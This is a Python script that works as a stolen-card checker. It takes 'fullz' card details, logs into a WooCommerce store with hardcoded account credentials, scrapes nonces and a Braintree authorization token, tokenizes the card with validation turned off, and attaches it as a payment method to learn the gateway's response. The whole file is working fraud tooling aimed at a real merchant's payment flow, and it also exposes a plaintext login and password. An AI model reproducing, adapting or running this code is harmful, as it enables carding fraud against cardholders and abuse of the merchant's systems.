import requests
from fake_useragent import UserAgent
import re
import asyncio
import httpx
import json
import base64
import random
from FUNC.defs import *
from bs4 import BeautifulSoup

def extract_string(s, start, end):
    """Extract a substring between two delimiters."""
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def create_braintree_auth(fullz, session):
    try:
        # Split the fullz into individual components
        cc, mes, ano, cvv = fullz.split("|")
        
        # Generate random user and email
        user = f"cristniki{random.randint(9999, 574545)}"
        mail = f"{user}@gmail.com"

        # Initialize session
        session = requests.Session()

        # Define the headers for the GET request
        headers = {
            'authority': 'my.restrictcontentpro.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://my.restrictcontentpro.com/my-account/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': UserAgent().random,
        }

        # Send the GET request to fetch the page
        response = session.get('https://my.restrictcontentpro.com/my-account/', headers=headers)
        nonce_value1 = extract_string(response.text, 'input type="hidden" id="woocommerce-login-nonce" name="woocommerce-login-nonce" value="', '" />')

        # Define the headers for the POST request (login attempt)
        headers_post = {
            'authority': 'my.restrictcontentpro.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://my.restrictcontentpro.com',
            'referer': 'https://my.restrictcontentpro.com/my-account/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': UserAgent().random,
        }

        # Define the data for the login POST request
        data = {
            'username': 'anonymoussurojit@gmail.com',  # Replace with environment variable
            'password': 'DDcc55@&####',  # Replace with environment variable
            'woocommerce-login-nonce': nonce_value1,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }

        # Send the POST request to log in
        response_post = session.post('https://my.restrictcontentpro.com/my-account/', headers=headers_post, data=data)

        # Fetch the add-payment-method page
        response = session.get('https://my.restrictcontentpro.com/my-account/add-payment-method/', headers=headers)
        add_payment_nonce = re.search(r'input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="([^"]+)"', response.text)
        client_token_nonce = re.search(r'"client_token_nonce":"([^"]+)"', response.text)

        if add_payment_nonce and client_token_nonce:
            add_payment_nonce_value = add_payment_nonce.group(1)
            client_token_nonce_value = client_token_nonce.group(1)

            headers = {
                'authority': 'my.restrictcontentpro.com',
                'accept': '*/*',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://my.restrictcontentpro.com',
                'referer': 'https://my.restrictcontentpro.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': UserAgent().random,
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': client_token_nonce_value,
            }

            response = session.post('https://my.restrictcontentpro.com/wp/wp-admin/admin-ajax.php', headers=headers, data=data)
            parsed_json = json.loads(response.text)
            decoded_data = base64.b64decode(parsed_json['data']).decode('utf-8')
            data_json = json.loads(decoded_data)
            auth = data_json.get('authorizationFingerprint', 'Not Found')

            headers = {
                'Accept': '*/*',
                'Authorization': f'Bearer {auth}',
                'Braintree-Version': '2018-05-10',
                'Content-Type': 'application/json',
                'Origin': 'https://assets.braintreegateway.com',
                'Referer': 'https://assets.braintreegateway.com',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
            }

            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': '7434070c-bb48-4f87-9f21-48364df5a79f',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mes,
                            'expirationYear': ano,
                            'cvv': cvv
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }

            response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            if response.status_code == 200:
                data = response.json()
                token = data["data"]["tokenizeCreditCard"]["token"]
            else:
                return "Failed to retrieve token"

            headers = {
                'authority': 'my.restrictcontentpro.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://my.restrictcontentpro.com',
                'referer': 'https://my.restrictcontentpro.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': UserAgent().random,
            }

            data = [
                ('payment_method', 'braintree_credit_card'),
                ('wc-braintree-credit-card-card-type', 'master-card'),
                ('wc-braintree-credit-card-3d-secure-enabled', ''),
                ('wc-braintree-credit-card-3d-secure-verified', ''),
                ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
                ('wc_braintree_credit_card_payment_nonce', token),
                ('wc_braintree_device_data', '{"correlation_id":"3f3b26d9403d6928819b1f88006fd178"}'),
                ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
                ('wc_braintree_paypal_payment_nonce', ''),
                ('wc-braintree-paypal-context', 'shortcode'),
                ('wc_braintree_paypal_amount', '0.00'),
                ('wc_braintree_paypal_currency', 'USD'),
                ('wc_braintree_paypal_locale', 'en_us'),
                ('wc-braintree-paypal-tokenize-payment-method', 'true'),
                ('woocommerce-add-payment-method-nonce', add_payment_nonce_value),
                ('_wp_http_referer', '/my-account/add-payment-method/'),
                ('woocommerce_add_payment_method', '1'),
            ]

            response = session.post(
                'https://my.restrictcontentpro.com/my-account/add-payment-method/', headers=headers,
                data=data,
            )

            text = response.text
            pattern = r'<ul class="woocommerce-error" role="alert">\s*<li>\s*Status code\s*([^<]+)\s*</li>'
            match = re.search(pattern, text)
            if match:
                code_text = match.group(1)
                return code_text
            
    except Exception as e:
        return str(e)